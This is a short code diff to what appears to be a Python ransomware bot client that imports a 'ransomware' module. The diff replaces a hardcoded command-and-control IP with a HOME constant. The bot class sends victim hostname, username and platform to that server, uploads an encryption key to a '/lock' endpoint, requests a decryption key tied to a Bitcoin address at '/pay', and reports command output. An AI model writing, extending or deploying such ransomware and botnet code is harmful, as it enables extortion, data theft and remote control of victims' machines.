@@ -13,6 +13,8 @@ from subprocess import check_output
 import ctypes
 import ransomware
 
+HOME = 'http://10.0.0.14'
+
 class Bot(object):
     def __init__(self):
         self.platform = platform.system()
@@ -37,19 +39,19 @@ class Bot(object):
                     'hostname': self.hostname,
                     'username': self.username
                 }           
-        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
+        r = requests.post(HOME + '/api/' + self.uid + '/status', json=send)
         return r.text
     def send_key(self, key):
-        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/lock', data= {'key':key})
+        r = requests.post(HOME + '/api/' + self.uid + '/lock', data= {'key':key})
         return r.text
 
     def request_key(self, btc_addr):
-        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/pay', data={'btc_addr':btc_addr})
+        r = requests.post(HOME + '/api/' + self.uid + '/pay', data={'btc_addr':btc_addr})
         return r.text
 
 
     def send_output(self, output):
-        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/report', data= {'output':output})
+        r = requests.post(HOME + '/api/' + self.uid + '/report', data= {'output':output})
         return r.text
 
     def run_command(self,command):
